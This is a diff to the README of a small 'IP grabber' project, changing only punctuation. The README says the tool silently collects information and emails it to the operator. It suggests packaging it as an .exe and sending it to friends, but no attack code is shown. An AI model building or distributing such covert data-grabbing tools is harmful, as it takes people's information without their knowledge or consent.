@@ -1,5 +1,5 @@
 # Simple-grabber
-Simple IP grabber thet can silently get informations and send it on your email . If you want you can fill the variables and export this fil to .exe with pyinstaller and send tis exe to your stinky friends. HeHe
+Simple IP grabber thet can silently get informations and send it on your email . If you want you can fill the variables and export this fil to .exe with pyinstaller and send tis exe to your stinky friends hehe.
 
 
 email_sender = ''
